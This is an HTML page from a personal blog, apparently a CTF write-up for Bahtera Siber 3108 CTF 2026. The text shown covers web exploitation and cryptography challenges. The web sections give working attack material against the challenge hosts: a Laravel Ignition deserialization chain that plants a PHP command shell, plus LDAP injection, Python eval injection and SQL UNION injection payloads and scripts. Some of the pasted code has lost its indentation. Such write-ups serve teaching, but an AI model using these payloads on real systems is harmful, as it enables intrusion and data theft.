@@ -1,0 +1,1713 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bahtera Siber 3108 CTF 2026: Warisan Takhta | 4ry</title>
+    <link rel="stylesheet" href="../styles.css?v=bahtera-3108">
+  </head>
+  <body>
+    <aside class="sidebar">
+      <a class="brand" href="../index.html" aria-label="Home"><img class="avatar" src="../assets/avatar.jpg" alt=""><span class="site-title">4ry</span></a>
+      <nav class="nav" aria-label="Primary navigation"><a class="nav-link" href="../index.html"><span>⌂</span>Home</a><a class="nav-link" href="../categories/index.html"><span>☰</span>Categories</a><a class="nav-link" href="/music/"><span>♪</span>Music</a><a class="nav-link" href="../about/index.html"><span>ⓘ</span>About</a></nav>
+      <div class="socials" aria-label="Social links"><button class="theme-toggle" type="button" aria-label="Toggle light mode">◐</button><a href="https://github.com/akmlalff" aria-label="GitHub"><img class="social-icon" src="../assets/icons/github.svg" alt=""></a><a href="https://www.linkedin.com/in/akmalaliff" aria-label="LinkedIn"><img class="social-icon" src="../assets/icons/linkedin.svg" alt=""></a><a href="mailto:akmalaliff@gmail.com" aria-label="Email"><img class="social-icon" src="../assets/icons/email.svg" alt=""></a><a href="https://open.spotify.com/user/22ixrbtx4wsrufvosaf2gf3ty?si=6948217fbb694f00" aria-label="Spotify"><img class="social-icon" src="../assets/icons/spotify.svg" alt=""></a></div>
+    </aside>
+    <main class="shell">
+      <header class="topbar"><div><a class="crumb" href="../index.html">Home</a><span class="muted"> › CTF › Bahtera Siber 3108 CTF 2026</span></div><label class="search"><span>⌕</span><input id="searchInput" type="search" placeholder="Search..."></label></header>
+      <div class="layout">
+        <article class="content article">
+          <header class="article-header"><h1>Bahtera Siber 3108 CTF 2026: Warisan Takhta</h1><div class="article-meta"><span>August 31, 2026</span><span>CTF</span><span>Bahtera Siber 3108 CTF 2026: Warisan Takhta / Writeup</span></div></header>
+          <div class="article-body imported-docx">
+            <details class="toc-panel" open>
+              <summary>Challenge index</summary>
+              <div class="toc-groups">
+                <section class="toc-group">
+                  <h3><a href="#web-exploitation">Web Exploitation</a> <span>5</span></h3>
+                  <ol>
+                    <li><a href="#kesultanan-pahang">Kesultanan Pahang</a></li>
+                    <li><a href="#direktori-sultan-selangor">Direktori Sultan Selangor</a></li>
+                    <li><a href="#titah-laju-2">Titah Laju 2</a></li>
+                    <li><a href="#titah-firman-diraja">Titah Firman Diraja</a></li>
+                    <li><a href="#13-jata-negeri">13 Jata Negeri</a></li>
+                  </ol>
+                </section>
+                <section class="toc-group">
+                  <h3><a href="#cryptography">Cryptography</a> <span>5</span></h3>
+                  <ol>
+                    <li><a href="#pembentukan-perlembagaan">Pembentukan Perlembagaan</a></li>
+                    <li><a href="#tertib-balairung">Tertib Balairung</a></li>
+                    <li><a href="#surat-pertabalan">Surat Pertabalan</a></li>
+                    <li><a href="#surat-pahlawan">Surat Pahlawan</a></li>
+                    <li><a href="#warkah-tergulung">Warkah Tergulung</a></li>
+                  </ol>
+                </section>
+                <section class="toc-group">
+                  <h3><a href="#digital-forensics">Digital Forensics</a> <span>5</span></h3>
+                  <ol>
+                    <li><a href="#warkah-dari-si-hulu-balang">Warkah Dari Si Hulu Balang</a></li>
+                    <li><a href="#risalah-istana-anak-bukit">Risalah Istana Anak Bukit</a></li>
+                    <li><a href="#layar-yang-menanti">Layar Yang Menanti</a></li>
+                    <li><a href="#lagenda-sultan-kedah-tua">Lagenda Sultan Kedah Tua</a></li>
+                    <li><a href="#cap-mohor-yang-hilang">Cap Mohor Yang Hilang</a></li>
+                  </ol>
+                </section>
+                <section class="toc-group">
+                  <h3><a href="#mobile-exploitation">Mobile Exploitation</a> <span>1</span></h3>
+                  <ol>
+                    <li><a href="#bahtera-pomodoro">Bahtera Pomodoro</a></li>
+                  </ol>
+                </section>
+                <section class="toc-group">
+                  <h3><a href="#osint">OSINT</a> <span>3</span></h3>
+                  <ol>
+                    <li><a href="#taman-hati">Taman Hati</a></li>
+                    <li><a href="#sebuah-istana">Sebuah Istana</a></li>
+                    <li><a href="#kudrat-raja-berdaulat">Kudrat Raja Berdaulat</a></li>
+                  </ol>
+                </section>
+                <section class="toc-group">
+                  <h3><a href="#miscellaneous">Miscellaneous</a> <span>3</span></h3>
+                  <ol>
+                    <li><a href="#cap-mohor-sembilan-mata">Cap Mohor Sembilan Mata</a></li>
+                    <li><a href="#persemadian-seorang-raja">Persemadian Seorang Raja</a></li>
+                    <li><a href="#titah-laju-1">Titah Laju 1</a></li>
+                  </ol>
+                </section>
+                <section class="toc-group">
+                  <h3><a href="#reverse-engineering">Reverse Engineering</a> <span>4</span></h3>
+                  <ol>
+                    <li><a href="#istana-guard">Istana Guard</a></li>
+                    <li><a href="#house-of">House of</a></li>
+                    <li><a href="#kuning-berdaulat">Kuning Berdaulat</a></li>
+                    <li><a href="#adat-istiadat-raja">Adat Istiadat Raja</a></li>
+                  </ol>
+                </section>
+                <section class="toc-group">
+                  <h3><a href="#binary-exploitation">Binary Exploitation</a> <span>4</span></h3>
+                  <ol>
+                    <li><a href="#majlis-raja-raja">Majlis Raja Raja</a></li>
+                    <li><a href="#cogan-alam">Cogan Alam</a></li>
+                    <li><a href="#warkah-diraja">Warkah Diraja</a></li>
+                    <li><a href="#cap-mohor">Cap Mohor</a></li>
+                  </ol>
+                </section>
+                <section class="toc-group">
+                  <h3><a href="#boot2root">Boot2Root</a> <span>2</span></h3>
+                  <ol>
+                    <li><a href="#warisan-takhta">Warisan Takhta</a></li>
+                    <li><a href="#warta-kelate">Warta Kelate</a></li>
+                  </ol>
+                </section>
+              </div>
+            </details>
+<h2 id="web-exploitation">Web Exploitation</h2>
+<h3 id="kesultanan-pahang">Kesultanan Pahang</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Menjelang majlis perasmian diraja, Kesultanan Pahang melancarkan portal rasmi baharu. Nampak gah, tetapi sistem yang dibina tergesa-gesa jarang sempat mengunci setiap pintu.</p>
+</div>
+<pre><code>The Laravel app exposed /_ignition/execute-solution with APP_DEBUG=true</code></pre>
+<pre><code>I used PHPGGC with a TAR-PHAR and the Guzzle/FW1 gadget:
+php -d phar.readonly=0 \</code></pre>
+<p>phpggc/phpggc \</p>
+<p>Guzzle/FW1 \</p>
+<pre><code>/var/www/html/storage/framework/views/5e18d2a684860074ab4c233e8218287c272576b3.php \</code></pre>
+<p>/tmp/view.php \</p>
+<p>--phar tar \</p>
+<p>--fast-destruct \</p>
+<p>-o /tmp/view-fw.tar</p>
+<h4>Payload</h4>
+<pre><code>&lt;?php echo &#x27;PWN3108:&#x27;; system($_GET[&#x27;cmd&#x27;] ?? &#x27;id&#x27;); ?&gt;</code></pre>
+<p>After triggering the Ignition exploit and overwriting Laravel’s compiled Blade cache, command execution was available through /.</p>
+<h4>Read .env</h4>
+<pre><code>curl -sG \</code></pre>
+<p>--data-urlencode &#x27;cmd=cat /var/www/html/.env&#x27; \</p>
+<p>&quot;$TARGET/&quot;</p>
+<h4>This revealed</h4>
+<pre><code>MERDEKA_FLAG=/flag.txt</code></pre>
+<h4>Then retrieve the flag</h4>
+<pre><code>curl -sG \</code></pre>
+<p>--data-urlencode &#x27;cmd=cat /flag.txt&#x27; \</p>
+<p>&quot;$TARGET/&quot;</p>
+<h4>Flag</h4>
+<pre><code>3108{m3rd3k4_s3l4lu_d1_h4t1}</code></pre>
+<h3 id="direktori-sultan-selangor">Direktori Sultan Selangor</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Menyelusuri sejarah pemerintahan Selangor, ayuhlah kita mengenali nama nama sultan yang pernah memerintah Negeri Selangor Darul Ehsan. Tetapi seperti ada satu **RAHSIA** yang disembunyikan oleh Sultan Selangor kini. Carilah kebenaran tersebut.</p>
+</div>
+<pre><code>?action=lookup&amp;name=Sharafuddin</code></pre>
+<p>application allows searching Sultan records using as above</p>
+<p>then I just test for LDAP Injection and confirmed the backend uses LDAP and it was vulnerable LDAP injection</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-01.png" alt="Bahtera Siber 3108 CTF evidence 1"></figure>
+<p>Saw this in description and was abit weirded out by it so I ask chatgpt to make a wordlist to enumerated possible attributes  based on the description and put rahsia in it and I was on point</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-02.png" alt="Bahtera Siber 3108 CTF evidence 2"></figure>
+<pre><code>[+] rahsia EXISTS</code></pre>
+<p>Test below and confirmed there is flag under rahsiathen I just ask chatgpt to make a solver for me</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-03.png" alt="Bahtera Siber 3108 CTF evidence 3"></figure>
+<pre><code>import requests
+import string
+import urllib3
+urllib3.disable_warnings()
+URL = &quot;https://selangor.bahterasiber.my/&quot;
+ATTRIBUTE = &quot;rahsia&quot;
+session = requests.Session()
+alphabet = string.ascii_letters + string.digits + &quot;_-&quot;
+flag = &quot;3108{&quot;
+def check(prefix):
+payload = f&quot;Sharafuddin*)({ATTRIBUTE}={prefix}*)(cn=&quot;
+r = session.get(
+URL,
+params={
+&quot;action&quot;: &quot;lookup&quot;,
+&quot;name&quot;: payload
+},
+verify=False,
+timeout=10
+)
+return &quot;Sultan Sharafuddin Idris Shah&quot; in r.text
+while True:
+if check(flag + &quot;}&quot;):
+flag += &quot;}&quot;
+print(&quot;FLAG:&quot;, flag)
+break
+for c in alphabet:
+if check(flag + c):
+flag += c
+print(&quot;[+]&quot;, flag)
+break</code></pre>
+<p class="flag-line"><strong>Flag: 3108{daulattuanku2001}</strong></p>
+<h3 id="titah-laju-2">Titah Laju 2</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Titah pertama telah berjaya disampaikan. Namun, perjalanan belum berakhir.</p>
+<p>Kali ini, titah yang lebih panjang menanti untuk disampaikan. Hanya mereka yang mampu mengekalkan ketepatan dan kepantasan akan berjaya menamatkan titah.</p>
+</div>
+<pre><code>The /rate endpoint evaluates the wpm parameter directly using Python:
+eval(wpm.lower())</code></pre>
+<p>So instead of sending a normal WPM value, we can inject Python code.</p>
+<p>The challenge has a blacklist, but open, next, and bytes are still allowed.</p>
+<h4>Exploit</h4>
+<p>We build flag.txt using bytes() and read the first line using:</p>
+<pre><code>next(open(b&quot;flag.txt&quot;))</code></pre>
+<p>Then we pass that result into another open():</p>
+<pre><code>open(next(open(b&quot;flag.txt&quot;)))</code></pre>
+<p>This makes Python try to open a file named after the flag, causing a FileNotFoundError.</p>
+<p>Since Flask debug mode is enabled, the error message leaks the flag in the response.</p>
+<h4>Final payload</h4>
+<pre><code>TARGET=&#x27;http://168.144.106.166:30006&#x27;
+PAYLOAD=&#x27;open(next(open(bytes([102])+bytes([102+2+2+2])+bytes([102-2-2-1])+bytes([102+1])+bytes([102-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2-2])+bytes([102+2+2+2+2+2+2+2])+bytes([102+2+2+2+2+2+2+2+2+2])+bytes([102+2+2+2+2+2+2+2]))))&#x27;
+curl -sG &quot;$TARGET/rate&quot; \</code></pre>
+<p>--data-urlencode &quot;wpm=$PAYLOAD&quot; \</p>
+<pre><code>| grep -oE &#x27;3108\{[^}]+\}&#x27;</code></pre>
+<h4>Flag</h4>
+<pre><code>3108{347f5791d2e33dc7504fe343dfa916b4}</code></pre>
+<h3 id="titah-firman-diraja">Titah Firman Diraja</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Istana Negara baru sahaja melancarkan Portal e-Rujukan untuk rakyat menyemak status permohonan mengadap DYMM Raja Berdaulat. Seorang bekas juruteknik portal, sebelum dibuang kerja, mendakwa sistem semakan status ini menyimpan rahsia yang boleh membuka laluan terus ke Bilik Firman Diraja tempat titah rasmi disimpan. Bahagian Keselamatan Siber Istana mahu pengesahan: adakah dakwaan itu benar?</p>
+</div>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-04.png" alt="Bahtera Siber 3108 CTF evidence 4"></figure>
+<p>Our TrackingID is in the cookies</p>
+<pre><code>curl -sk \
+-H &quot;Cookie: TrackingId=&#x27; OR 1=1-- -&quot; \
+&#x27;https://diraja.bahterasiber.my/semak&#x27;</code></pre>
+<p>Tested for sql injection and succeed so I tried for union injection and succeed as well</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-05.png" alt="Bahtera Siber 3108 CTF evidence 5"></figure>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-06.png" alt="Bahtera Siber 3108 CTF evidence 6"></figure>
+<p>Enumerate the table</p>
+<pre><code>curl -sk \
+-H &quot;Cookie: TrackingId=&#x27; UNION SELECT (SELECT group_concat(name,&#x27;|&#x27;) FROM sqlite_master WHERE type=&#x27;table&#x27; AND name NOT LIKE &#x27;sqlite_%&#x27;)-- -&quot; \
+&#x27;https://diraja.bahterasiber.my/semak&#x27;</code></pre>
+<p>Got this: users|tracking_sessions|royal_archive</p>
+<p>dump royal_archive:</p>
+<pre><code>curl -sk \
+-H &quot;Cookie: TrackingId=&#x27; UNION SELECT (SELECT group_concat(id||&#x27;:&#x27;||title||&#x27;:&#x27;||secret,&#x27; | &#x27;) FROM royal_archive)-- -&quot; \
+&#x27;https://diraja.bahterasiber.my/semak&#x27;</code></pre>
+<p>Got below</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-07.png" alt="Bahtera Siber 3108 CTF evidence 7"></figure>
+<p class="flag-line"><strong>Flag: 3108{jejak_sang_daulat_terungkai}</strong></p>
+<h3 id="13-jata-negeri">13 Jata Negeri</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Setiap lambang melambangkan kedaulatan, tetapi sistem yang tidak dikawal mampu membuka pintu kepada pencerobohan. Flag di /flag/flag.txt</p>
+</div>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-08.png" alt="Bahtera Siber 3108 CTF evidence 8"></figure>
+<p>Website used Joomla so based on recent events I just used the poc below</p>
+<pre><code>https://github.com/0xgh057r3c0n/CVE-2026-48907/blob/main/README.md</code></pre>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-09.png" alt="Bahtera Siber 3108 CTF evidence 9"></figure>
+<p class="flag-line"><strong>Flag: 3108{075b436118261561590b7dba118e3e7e}</strong></p>
+<h2 id="cryptography">Cryptography</h2>
+<h3 id="pembentukan-perlembagaan">Pembentukan Perlembagaan</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Dalam pembentukan sebuah negara, setiap titah, perjanjian dan keputusan mempunyai makna yang tersendiri.</p>
+<p>Namun, sebuah dokumen lama telah ditemui dengan susunan aksara yang kelihatan seperti tidak mempunyai makna. Mungkin ada sesuatu yang tersembunyi di sebalik teks tersebut.</p>
+<p>“Setiap aksara mempunyai peranan dalam membentuk sebuah takhta.”</p>
+</div>
+<h4>solve.py</h4>
+<pre><code>python
+import hashlib
+import itertools
+from pathlib import Path
+from Crypto.Util.number import long_to_bytes
+from sympy.ntheory.residue_ntheory import nthroot_mod
+from sympy.ntheory.modular import crt
+N = 10113028726184229245071727249109704552308262242102303274043468925443911532549486482668693875176728281383479599276299
+c = int(Path(&quot;crypto/public/perjanjian_kemerdekaan.enc&quot;).read_text())
+p = 230752113913959865581818660801451565217
+q = 186496761338639594947079886667494911983
+r = 234998049837510804173099159711545733509
+assert p * q * r == N
+primes = [p, q, r]
+def recover_perlembagaan(ciphertext):
+for mask in range(2**32):
+candidate = ciphertext ^ mask
+digest = hashlib.sha256(long_to_bytes(candidate)).hexdigest()
+if int(digest[:8], 16) == mask:
+yield candidate, mask
+# In practice I found this mask with a small compiled brute-forcer.
+for perlembagaan, mask in [(c ^ 0x4034035c, 0x4034035c)]:
+roots5 = [
+nthroot_mod(perlembagaan % prime, 5, prime, True)
+for prime in primes
+]
+for combo5 in itertools.product(*roots5):
+draf = int(crt(primes, combo5)[0])
+rundingan = (draf - (p + q)) % N
+roots3 = [
+nthroot_mod(rundingan % prime, 3, prime, True)
+for prime in primes
+]
+for combo3 in itertools.product(*roots3):
+m = int(crt(primes, combo3)[0])
+plaintext = long_to_bytes(m)
+if plaintext.startswith(b&quot;3108{&quot;):
+print(plaintext.decode())</code></pre>
+<p class="flag-line"><strong>Flag: 3108{raja_berperlembagaan_05081957}</strong></p>
+<h3 id="tertib-balairung">Tertib Balairung</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>&quot;Adapun jika mengadap nobat, barang Orang Besar-besar dari kiri gendang; barang orang keci1 dari kanan gendang. Adapun yang kena sirih nobat pertama ....&quot;</p>
+<p>Bahawa sembilan pembesar yang bergelar dalam naskhah hikayat itu didaulkan kedudukan selajur mengikut susunan bibit mula persuratan awal namanya, tersusun dari kiri membawa ke kanan balairung.</p>
+<p>Maka peri menyatakan rahsia susunan tulisannya: Syahadan apabila wazir bersemayam mengadap raja, maka baris tulisan dibaca dari kiri mengalir ke kanan; namun apabila angkatan berarak berjalan, ditukar arahnya dari kanan berpaling ke kiri, silih berganti seperti jalurnya lembu membajak padang. Hendaklah didahulukan petikannya, yang tersembunyi pada tertib sapaan sirih nobat dalam hikayat tua, abjad siapa yang mendahului, dialah yang dipetik terlebih dahulu.</p>
+</div>
+<p>Cipher text in cenderamata.txt</p>
+<p>3T3415041}IHKUX84UBN1_NLR{BK_G0TT4U1NNCXR__NX</p>
+<p>Chall description below helped a lot I told gpt to split the ciphertext into 9 blocks of 5 because of 9 pembesar and then read it from left to right and right to left.</p>
+<p>&quot;Adapun jika mengadap nobat, barang Orang Besar-besar dari kiri gendang; barang orang keci1 dari kanan gendang. Adapun yang kena sirih nobat pertama ....&quot;</p>
+<p>Bahawa sembilan pembesar yang bergelar dalam naskhah hikayat itu didaulkan kedudukan selajur mengikut susunan bibit mula persuratan awal namanya, tersusun dari kiri membawa ke kanan balairung.</p>
+<p>Maka peri menyatakan rahsia susunan tulisannya: Syahadan apabila wazir bersemayam mengadap raja, maka baris tulisan dibaca dari kiri mengalir ke kanan; namun apabila angkatan berarak berjalan, ditukar arahnya dari kanan berpaling ke kiri, silih berganti seperti jalurnya lembu membajak padang. Hendaklah didahulukan petikannya, yang tersembunyi pada tertib sapaan sirih nobat dalam hikayat tua, abjad siapa yang mendahului, dialah yang dipetik terlebih dahulu.</p>
+<p class="flag-line"><strong>Flag: 3108{51RIH_N0B4T_T3NTUK4N_KUNC1_B4L41RUNG}</strong></p>
+<h3 id="surat-pertabalan">Surat Pertabalan</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Menjelang istiadat pertabalan, kerani protokol menemui sekeping surat lama dalam bilik simpanan regalia - titah lama yang dimeteraikan rapi.</p>
+<p>Kerani lama tu perasan: dia meteraikan setiap titah dengan &quot;***Kehadapan Vigenere***&quot;, kata kunci LAPAN huruf yang sama untuk semua suratnya - &quot;**KERAJAAN**&quot;</p>
+<p>&quot;Kepada yang berani dan yang layak..&quot;</p>
+<p>zip password: infected</p>
+</div>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-10.png" alt="Bahtera Siber 3108 CTF evidence 10"></figure>
+<p>Found out it has macros so I check it use olevba and below is what we’re looking for</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-11.png" alt="Bahtera Siber 3108 CTF evidence 11"></figure>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-12.png" alt="Bahtera Siber 3108 CTF evidence 12"></figure>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-13.png" alt="Bahtera Siber 3108 CTF evidence 13"></figure>
+<p>These are everything we need</p>
+<p>A+B+B+C+D = ZEEJR</p>
+<p>E+F+F+G+H = PAATM</p>
+<p>I+B+F+J+K+L+J+M = SEAKIOKV</p>
+<p>Ciphertext: ZEEJR_PAATM_SEAKIOKV</p>
+<figure><img src="../assets/writeups/bahtera-siber-3108-ctf-2026/images/bahtera-3108-14.png" alt="Bahtera Siber 3108 CTF evidence 14"></figure>
+<p>Based on the description the key is Kerajaan</p>
+<p class="flag-line"><strong>Flag: 3108{panji_panji_berkibar}</strong></p>
+<h3 id="surat-pahlawan">Surat Pahlawan</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Kisah ini berlatarkan abad ke-16, semasa kemuncak kegemilangan Kesultanan Melaka. Armada Portugis kelihatan gah di ufuk, dan Sultan sedang menghantar titah diraja sulit kepada Panglima kepercayaan baginda menggunakan kaedah pertukaran kunci *Diffie-Hellman* bagi menjamin keselamatan komunikasi.</p>
+<p>Namun, seorang perisik musuh telah menyusup masuk dan memintas penghantaran rahsia diraja tersebut. Murka dengan keadaan itu, Sultan mengarahkan tentera diraja serta pasukan elit pemburu ancaman untuk masuk ke dalam hutan tebal Melaka bagi melancarkan perang gerila demi menjejak dan mendedahkan identiti perisik musuh itu.</p>
+<p>Laporan perisikan daripada peninjau diraja menunjukkan bahawa minda perisik yang mudah hilang tumpuan dan tidak sabar itu jarang melangkaui 14,000,605 kemungkinan fikiran semasa memalsukan cap mohor sulit. Tambahan pula, memandangkan perisik itu tidak mempunyai peralatan canggih, nilai permulaan (*initialization vector - IV*) sifirnya terhad kepada sebuah buku kod kecil yang mengandungi nombor antara 1 hingga 5,000 sahaja.</p>
+<p>Sultan telah menawarkan ganjaran yang lumayan: Bawa perisik musuh itu ke hadapan baginda dan anda pasti akan diberi ganjaran!</p>
+<p>1. GET - http://IP:PORT/intercept</p>
+<p>2. POST - http://IP:PORT/verify Body JSON:- secret_phrase:</p>
+</div>
+<p>/intercept leaks the Diffie-Hellman parameters:</p>
+<pre><code>A, B, g, p, IV, encrypted_payload</code></pre>
+<p>The weakness is that the DH private exponent is limited to only:</p>
+<pre><code>1 - 14,000,605</code></pre>
+<p>So we brute-force x until:</p>
+<pre><code>g^x mod p == A</code></pre>
+<p>or:</p>
+<pre><code>g^x mod p == B</code></pre>
+<p>Then calculate the shared secret and derive the AES key:</p>
+<pre><code>shared = pow(B, x, p)
+key = SHA1(str(shared))[:16]</code></pre>
+<p>Decrypting the ciphertext with AES-128-CBC reveals the temporary secret phrase.</p>
+<p>For my instance:</p>
+<p>Private exponent : 10039744</p>
+<p>Shared secret    : 665602571758181434325724424497106950956683125</p>
+<p>AES key          : a4df8d070501ab75d7e3071544d7beb6</p>
+<p>Secret phrase    : Mata_Pedang_Laksamana</p>
+<pre><code>Submitting the phrase to /verify returned an encrypted ZIP and:</code></pre>
+<p>ZIP Password: Kunci_Rahsia_Bendahara</p>
+<p>Extracting final_flag.txt gave the flag.</p>
+<h4>Solve.py</h4>
+<pre><code>#!/usr/bin/env python3
+import json
+import hashlib
+import subprocess
+import time
+import base64
+from urllib.request import Request, build_opener
+from urllib.error import HTTPError
+BASE = &quot;http://168.144.106.166:30011&quot;
+MAX_PRIVATE = 14_000_605
+def crack_dh(g, p, A, B):
+current = 1
+for x in range(1, MAX_PRIVATE + 1):
+current = (current * g) % p
+if current == A:
+return x, pow(B, x, p)
+if current == B:
+return x, pow(A, x, p)
+raise Exception(&quot;Private exponent not found&quot;)
+def decrypt_aes(key, iv, ciphertext):
+result = subprocess.run(
+[
+&quot;openssl&quot;,
+&quot;enc&quot;,
+&quot;-aes-128-cbc&quot;,
+&quot;-d&quot;,
+&quot;-K&quot;, key.hex(),
+&quot;-iv&quot;, iv.hex(),
+],
+input=ciphertext,
+stdout=subprocess.PIPE,
+stderr=subprocess.DEVNULL
+)
+return result.stdout.decode().strip()
+opener = build_opener()
+# GET fresh challenge
+data = json.loads(
+opener.open(BASE + &quot;/intercept&quot;).read().decode()
+)
+A = int(data[&quot;A&quot;], 16)
+B = int(data[&quot;B&quot;], 16)
+g = int(data[&quot;g&quot;], 16)
+p = int(data[&quot;p&quot;], 16)
+iv = bytes.fromhex(data[&quot;iv&quot;])
+ciphertext = bytes.fromhex(data[&quot;encrypted_payload&quot;])
+print(&quot;[*] Cracking DH...&quot;)
+private, shared = crack_dh(g, p, A, B)
+print(&quot;[+] Private exponent:&quot;, private)
+print(&quot;[+] Shared secret:&quot;, shared)
+# SHA1(decimal shared secret)[:16]
+key = hashlib.sha1(
+str(shared).encode()
+).digest()[:16]
+print(&quot;[+] AES key:&quot;, key.hex())
+phrase = decrypt_aes(
+key,
+iv,
+ciphertext
+)
+print(&quot;[+] Secret phrase:&quot;, phrase)
+body = json.dumps({
+&quot;secret_phrase&quot;: phrase
+}).encode()
+# Retry because server may use multiple workers / rate limit
+for attempt in range(20):
+req = Request(
+BASE + &quot;/verify&quot;,
+data=body,
+method=&quot;POST&quot;,
+headers={
+&quot;Content-Type&quot;: &quot;application/json&quot;
+}
+)
+try:
+response = opener.open(req)
+result = json.loads(
+response.read().decode()
+)
+print(&quot;[+] Verification successful&quot;)
+if &quot;zip_base64&quot; in result:
+with open(&quot;final.zip&quot;, &quot;wb&quot;) as f:
+f.write(
+base64.b64decode(
+result[&quot;zip_base64&quot;]
+)
+)
+print(&quot;[+] Saved: final.zip&quot;)
+print(&quot;[+] ZIP password:&quot;, result[&quot;zip_password&quot;])
+break
+except HTTPError as e:
+print(&quot;[-]&quot;, e.read().decode())
+time.sleep(3.2)</code></pre>
+<pre><code>7z x final.zip -p Kunci_Rahsia_Bendahara
+cat final_flag.txt
+Flag: 3108{S4nd1_B3nd4h4r4_Cr4cked_Time_Attack_Master}</code></pre>
+<h3 id="warkah-tergulung">Warkah Tergulung</h3>
+<div class="challenge-description">
+<h4>Description</h4>
+<p>Sepucuk warkah dari istana Terengganu dihantar bermeterai dua lapis: meterai luar yang terlepas sedikit rahsia setiap kali anda bertanya, dan meterai dalam yang menyimpan isi warkah itu sendiri. Jurutulis istana yakin warkah ini tak mungkin dibuka. Buktikan mereka silap.</p>
+</div>
+<p>The challenge uses two RSA layers sharing the same PREFIX.</p>
+<pre><code>c1 = PREFIX^e1 mod n1
+c2 = (PREFIX * 2^1024 + FLAG)^3 mod n2</code></pre>
+<p>The server provides an lsb oracle that leaks the least significant bit of RSA decryption.</p>
+<h4>Recover Prefix</h4>
+<p>Using RSA&#x27;s multiplicative property:</p>
+<pre><code>c&#x27; = c1 * (2^e1)^i mod n1</code></pre>
+<p>The oracle reveals the parity of:</p>
+<p>PREFIX * 2^i mod n1</p>
+<p>This allows us to repeatedly halve the possible plaintext range.</p>
+<p>After around 1024 queries:</p>
+<p>PREFIX =</p>
+<p>0x6878d4f28c7b4c9e161491ec776e4057d4b0d221a40f77cf73d014ae05640aa9</p>
+<h4>Recover Flag</h4>
+<p>Now:</p>
+<pre><code>c2 = (PREFIX * 2^1024 + FLAG)^3 mod n2</code></pre>
+<p>Define:</p>
+<pre><code>f(x) = (PREFIX * 2^1024 + x)^3 - c2</code></pre>
+<p>Since e2 = 3 and the flag is small, use SageMath&#x27;s Coppersmith small_roots() to recover x = FLAG.</p>
+<h4>Solve.py</h4>
+<pre><code>python solve.py
+import socket
+import re
+from fractions import Fraction
+from sage.all import ZZ, Zmod, PolynomialRing
+HOST = &quot;167.99.71.153&quot;
+PORT = 31117
+s = socket.create_connection((HOST, PORT))
+data = b&quot;&quot;
+while data.count(b&quot;============================================================&quot;) &lt; 2:
+data += s.recv(8192)
+banner = data.decode()
+print(banner)
+def get(name):
+m = re.search(
+rf&quot;(?m)^\s*{name}\s*=\s*(0x[0-9a-fA-F]+|\d+)&quot;,
+banner
+)
+return int(m.group(1), 0)
+n1 = get(&quot;n1&quot;)
+e1 = get(&quot;e1&quot;)
+c1 = get(&quot;c1&quot;)
+n2 = get(&quot;n2&quot;)
+e2 = get(&quot;e2&quot;)
+c2 = get(&quot;c2&quot;)
+L = get(&quot;L&quot;)
+def oracle(c):
+s.sendall(f&quot;lsb 0x{c:x}\n&quot;.encode())
+while True:
+r = s.recv(4096).decode(errors=&quot;ignore&quot;)
+m = re.search(r&quot;\b([01])\s*$&quot;, r.strip())
+if m:
+return int(m.group(1))
+# Stage 1: RSA LSB Oracle
+low = Fraction(0)
+high = Fraction(n1)
+mul = pow(2, e1, n1)
+cur = c1
+for _ in range(n1.bit_length() + 4):
+cur = (cur * mul) % n1
+bit = oracle(cur)
+mid = (low + high) / 2
+if bit == 0:
+high = mid
+else:
+low = mid
+prefix = None
+for base in [int(low), int(high)]:
+for x in range(max(0, base - 64), base + 65):
+if pow(x, e1, n1) == c1:
+prefix = x
+break
+print(&quot;[+] PREFIX:&quot;, hex(prefix))
+# Stage 2: Coppersmith
+known = ZZ(prefix) * (ZZ(2) ** L)
+R = PolynomialRing(Zmod(n2), &quot;x&quot;)
+x = R.gen()
+f = ((known + x) ** e2 - c2).monic()
+for bits in [384, 448, 512, 640, 768]:
+roots = f.small_roots(
+X=ZZ(2) ** bits,
+beta=1,
+epsilon=1/24
+)
+for root in roots:
+flag_int = int(root)
+if pow(int(known) + flag_int, e2, n2) == c2:
+flag = flag_int.to_bytes(
+(flag_int.bit_length() + 7) // 8,
+&quot;big&quot;
+)
+if b&quot;3108{&quot; in flag:
+print(&quot;[FLAG]&quot;, flag.decode())
+exit()</code></pre>
+<pre><code>Flag: 3108{tr3ngg4nu_rsa_c0pp3rsm1th_b78adbeab693fe07a8e01a8e34eea5de}</code></pre>
+<h2 id="digital-forensics">Digital Forensics</h2>
+<h3 id="warkah-dari-si-hulu-balang">Warkah Dari Si Hulu Balang</h3>
+<div class="challenge-description">
+<h4>Description</h4>
